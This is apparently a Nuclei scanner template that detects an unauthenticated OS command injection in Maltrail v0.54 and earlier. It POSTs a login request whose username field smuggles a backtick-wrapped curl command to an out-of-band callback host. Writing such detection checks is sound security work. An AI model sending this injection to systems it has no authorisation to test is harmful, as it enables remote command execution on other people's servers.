http:
- body: username=;`{{ payload }}`
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/login'
  - '{{BaseURL}}login'
id: maltrail-os-command-injection
info:
  author: Esonhugh-self-maintained
  description: 'Maltrail <= v0.54 is vulnerable to unauthenticated OS command injection
    during the login process.

    '
  name: Unauthenticated OS Command Injection in stamparm/maltrail
  reference:
  - https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
  severity: critical
  tags: rce,shell,oast
variables:
  payload: curl+{{interactsh-url}}
